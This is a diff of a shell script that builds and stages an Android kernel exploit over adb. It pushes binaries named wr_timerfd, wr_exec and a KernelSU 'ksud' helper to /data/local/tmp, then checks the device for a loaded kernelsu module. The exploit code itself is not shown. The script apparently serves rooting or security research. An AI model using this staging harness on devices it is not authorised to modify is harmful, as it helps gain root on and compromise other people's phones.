@@ -6,8 +6,10 @@ set -u
 D=${D:-R5CYA0Q7AYL}
 W=/data/local/tmp/wr
 MODE=${1:-run}
+BUILD=${BUILD:-S731BXXU9CZIF}
 ROOT=$(cd "$(dirname "$0")/.." && pwd)
-BIN="$ROOT/assets/payload/S731BXXU9CZIF"
+BIN="$ROOT/build/payload/$BUILD"
+HELPER="$ROOT/payloads/ksud"
 
 say() { printf '%s\n' "$*"; }
 
@@ -28,9 +30,10 @@ say "== device =="
 adb -s "$D" shell 'echo "uptime=$(cut -d" " -f1 /proc/uptime)"; echo "kernelsu=$(grep -c "^kernelsu " /proc/modules 2>/dev/null)"; echo "parked=$(pidof wr_timerfd timer_s25fe timer_s731b | wc -w)"'
 
 if [ "$MODE" = "run" ] || [ "$MODE" = "stage" ]; then
-    if [ ! -x "$BIN/wr_timerfd" ] || [ ! -x "$BIN/wr_exec" ] || [ ! -f "$BIN/ksud" ]; then
+    if [ ! -x "$BIN/wr_timerfd" ] || [ ! -x "$BIN/wr_exec" ] || [ ! -f "$HELPER" ]; then
         say "== build =="
-        "$ROOT/exploit/build.sh" || exit 1
+        PROFILE="$ROOT/payloads/$BUILD/profile.json" BUILD="$BUILD" \
+            "$ROOT/exploit/build.sh" || exit 1
     fi
 fi
 
@@ -38,7 +41,7 @@ say "== stage =="
 adb -s "$D" shell "mkdir -p $W" || exit 1
 adb -s "$D" push "$BIN/wr_timerfd" $W/wr_timerfd 2>&1 | tail -1
 adb -s "$D" push "$BIN/wr_exec"     $W/wr_exec     2>&1 | tail -1
-adb -s "$D" push "$BIN/ksud"        $W/ksud        2>&1 | tail -1
+adb -s "$D" push "$HELPER"          $W/ksud        2>&1 | tail -1
 adb -s "$D" shell "chmod 755 $W/wr_timerfd $W/wr_exec $W/ksud 2>/dev/null; ls -l $W; sha256sum $W/wr_timerfd $W/wr_exec $W/ksud"
 
 if [ "$MODE" = "stage" ]; then
